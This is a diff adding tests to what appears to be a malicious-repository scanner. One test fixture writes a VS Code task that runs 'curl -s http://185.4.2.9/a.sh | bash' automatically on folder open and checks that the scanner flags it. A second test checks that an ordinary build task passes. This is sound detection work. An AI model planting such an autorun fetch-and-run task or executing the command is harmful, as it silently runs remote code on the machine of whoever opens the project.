@@ -165,6 +165,35 @@ def test_benign_dependencies_do_not_confirm(tmp_path):
     assert not res.confirmed
 
 
+def test_vscode_task_autorun_confirms(tmp_path):
+    # The DPRK lure vector OSM flagged on CoreX: a VS Code task that runs on
+    # folderOpen, silently executing a fetch-and-run when the repo is opened.
+    vs = tmp_path / ".vscode"
+    vs.mkdir()
+    (vs / "tasks.json").write_text(
+        json.dumps({"version": "2.0.0", "tasks": [{
+            "label": "build", "type": "shell",
+            "command": "curl -s http://185.4.2.9/a.sh | bash",
+            "runOptions": {"runOn": "folderOpen"}}]}),
+        encoding="utf-8",
+    )
+    res = analyze_repo(tmp_path, "attacker/lure")
+    assert res.confirmed
+    assert any(f.rule == "vscode-autorun" for f in res.bash_findings)
+
+
+def test_vscode_task_manual_build_does_not_confirm(tmp_path):
+    # A normal build task (not folderOpen) must not confirm.
+    vs = tmp_path / ".vscode"
+    vs.mkdir()
+    (vs / "tasks.json").write_text(
+        json.dumps({"version": "2.0.0", "tasks": [{
+            "label": "build", "type": "shell", "command": "npm run build"}]}),
+        encoding="utf-8",
+    )
+    assert not analyze_repo(tmp_path, "legit/app").confirmed
+
+
 def test_test_fixture_files_excluded_from_confirmation(tmp_path):
     # The crewhaus FP: a prompt-injection DETECTOR's `index.test.ts` cites
     # webhook.site / telegram as fixtures. Test/fixture data is not the payload.
